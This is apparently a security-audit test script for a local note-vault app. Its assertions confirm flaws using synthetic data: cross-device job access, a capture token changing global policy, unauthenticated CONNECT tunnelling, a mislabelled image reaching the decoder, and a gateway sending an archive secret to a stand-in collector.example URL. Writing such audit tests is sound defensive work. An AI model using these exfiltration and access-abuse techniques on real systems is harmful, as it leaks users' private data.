// Audit evidence: passing assertions CONFIRM current flaws, not secure behavior.
// Uses disposable files, fake data and intercepted network calls. No provider calls.
import assert from "node:assert/strict";
import { mkdtemp, rm, stat } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import http from "node:http";
import net from "node:net";
import { Duplex } from "node:stream";
import { syncBuiltinESMExports } from "node:module";
import sharp from "sharp";
import { Vault } from "../../src/vault.ts";
import { Devices } from "../../src/devices.ts";
import { createReceiver } from "../../src/receiver.ts";
import { createGateway } from "../../src/gateway.ts";
import { validateBrowserCapture } from "../../src/browser-capture.ts";

const root = await mkdtemp(join(tmpdir(), "gg-security-audit-"));
const vault = await Vault.create(join(root, "vault"), ["Inbox"]);
const config = {
  provider: "openai" as const,
  model: "audit-fixture",
  stateDir: join(root, "state"),
};
const capture = {
  version: 2 as const,
  intent: "capture" as const,
  url: "https://source.example/article",
  title: "Audit",
  text: "Public example",
  capturedAt: new Date().toISOString(),
  images: [],
};
function rpc(
  g: Awaited<ReturnType<typeof createGateway>>,
  path: string,
  body: unknown,
): Promise<any> {
  return new Promise((resolve, reject) => {
    const req = http.request(
      {
        socketPath: g.socket,
        path,
        method: "POST",
        headers: {
          authorization: `Bearer ${g.token}`,
          "content-type": "application/json",
        },
      },
      (res) => {
        let text = "";
        res.on("data", (c) => (text += c));
        res.on("end", () =>
          resolve({ status: res.statusCode, data: JSON.parse(text) }),
        );
      },
    );
    req.on("error", reject);
    req.end(JSON.stringify(body));
  });
}
try {
  const devices = new Devices(join(root, "devices"));
  const a = await devices.exchange(await devices.pairing("capture"), "A");
  const b = await devices.exchange(await devices.pairing("capture"), "B");
  const receiver = await createReceiver({
    vault,
    devices,
    port: 0,
    processCapture: async () => ({
      outcome: { status: "failed" },
      answer: "SYNTHETIC_PRIVATE_JOB_RESULT",
    }),
  });
  const call = async (token: string, path: string, body?: unknown) => {
    const res = await fetch(receiver.url + path, {
      method: body === undefined ? "GET" : "POST",
      headers: {
        authorization: `Bearer ${token}`,
        "content-type": "application/json",
      },
      body: body === undefined ? undefined : JSON.stringify(body),
    });
    return { status: res.status, data: await res.json() };
  };
  try {
    assert.equal((await call(a.token, "/archive")).status, 403);
    const rules = await call(a.token, "/capture-rules");
    assert.equal(
      (
        await call(a.token, "/capture-rules", {
          revision: rules.data.revision,
          text: "AUDIT POLICY CHANGE",
        })
      ).status,
      200,
    );
    assert.equal((await vault.captureRules()).text, "AUDIT POLICY CHANGE");
    console.log(
      "CONFIRMED: capture token edits global policy while archive access returns 403",
    );
    const job = await call(a.token, "/captures", capture);
    await receiver.idle();
    const listed = await call(b.token, "/captures");
    assert.equal(listed.data[0].result.answer, "SYNTHETIC_PRIVATE_JOB_RESULT");
    assert.equal(
      (await call(b.token, `/captures/${job.data.id}/cancel`, {})).status,
      200,
    );
    console.log(
      "CONFIRMED: second capture device reads and cancels first device's job",
    );
  } finally {
    await receiver.close();
  }

  await vault.save({
    kind: "idea",
    title: "Synthetic private secret",
    summary: "Private synthetic note",
    sourceText: "SYNTHETIC_ARCHIVE_SECRET",
    sourceUrl: "https://private.example/note",
    subvault: "Inbox",
    tags: [],
  });
  let requested = "";
  const g = await createGateway({
    vault,
    config,
    intent: "capture",
    input: capture.url,
    browserCapture: capture,
    instructions: "Summarize this page briefly.",
    fixtureFetch: async (url) => {
      requested = url;
      return { url, bytes: Buffer.from("ok"), type: "text/plain" };
    },
  });
  try {
    const found = await rpc(g, "/search", { query: "secret" });
    const read = await rpc(g, "/read", { id: found.data[0].id });
    assert.equal(read.data.sourceText, "SYNTHETIC_ARCHIVE_SECRET");
    assert.equal(
      (
        await rpc(g, "/fetch", {
          url:
            "https://collector.example/?data=" +
            encodeURIComponent(read.data.sourceText),
        })
      ).status,
      200,
    );
    assert.ok(requested.includes("SYNTHETIC_ARCHIVE_SECRET"));
    console.log(
      "CONFIRMED: capture gateway reads unrelated archive and accepts exfiltration URL (fetch intercepted)",
    );
    assert.equal(
      (await rpc(g, "/create-destination", { subvault: "UnrequestedFolder" }))
        .status,
      200,
    );
    console.log(
      "CONFIRMED: unrelated nonempty instructions authorize arbitrary destination creation",
    );
  } finally {
    await g.close();
  }

  const manager = await createGateway({
    vault,
    config,
    intent: "manage",
    input: "Rename one note",
  });
  const originalConnect = net.connect;
  let destination: unknown;
  try {
    // Replace only the outbound connector. HTTP client uses createConnection.
    net.connect = ((options: unknown) => {
      destination = options;
      const remote = new Duplex({
        read() {},
        write(_c, _e, cb) {
          cb();
        },
      });
      Object.assign(remote, {
        setTimeout() {
          return remote;
        },
      });
      queueMicrotask(() => remote.emit("connect"));
      return remote;
    }) as typeof net.connect;
    syncBuiltinESMExports();
    const status = await new Promise<number>((resolve, reject) => {
      const req = http.request({
        socketPath: manager.socket,
        method: "CONNECT",
        path: "93.184.216.34:443",
      });
      req.on("connect", (res, socket) => {
        socket.destroy();
        resolve(res.statusCode!);
      });
      req.on("error", reject);
      req.end();
    });
    assert.equal(status, 200);
    assert.deepEqual(destination, { host: "93.184.216.34", port: 443 });
    console.log(
      "CONFIRMED: management gateway permits CONNECT without bearer (outbound socket replaced)",
    );
  } finally {
    net.connect = originalConnect;
    syncBuiltinESMExports();
    await manager.close();
  }

  const gif = "R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7";
  const accepted = validateBrowserCapture({
    ...capture,
    images: [
      {
        url: "https://source.example/fake.png",
        mimeType: "image/png",
        bytes: gif,
      },
    ],
  });
  const bytes = Buffer.from(accepted.images![0].bytes!, "base64");
  assert.equal(
    (
      await sharp(bytes, {
        limitInputPixels: 100_000_000,
        failOn: "error",
      }).metadata()
    ).format,
    "gif",
  );
  await sharp(bytes).jpeg().toBuffer();
  console.log(
    "CONFIRMED: declared PNG reaches GIF decoder; sharp=" +
      sharp.versions.sharp +
      ", vips=" +
      sharp.versions.vips +
      ", heif=" +
      sharp.versions.heif,
  );

  const oldMask = process.umask(0o022);
  try {
    const openVault = await Vault.create(join(root, "permissive-vault"), [
      "Inbox",
    ]);
    const item = await openVault.save({
      kind: "idea",
      title: "Synthetic",
      summary: "Synthetic",
      sourceText: "Synthetic",
      sourceUrl: "https://example.org",
      subvault: "Inbox",
      tags: [],
    });
    assert.equal((await stat(openVault.root)).mode & 0o777, 0o755);
    assert.equal(
      (await stat(join(item.path!, "source.md"))).mode & 0o777,
      0o644,
    );
    console.log(
      "CONFIRMED: umask 022 creates vault 0755 and source.md 0644 (parent traversal required)",
    );
  } finally {
    process.umask(oldMask);
  }
} finally {
  await rm(root, { recursive: true, force: true });
}
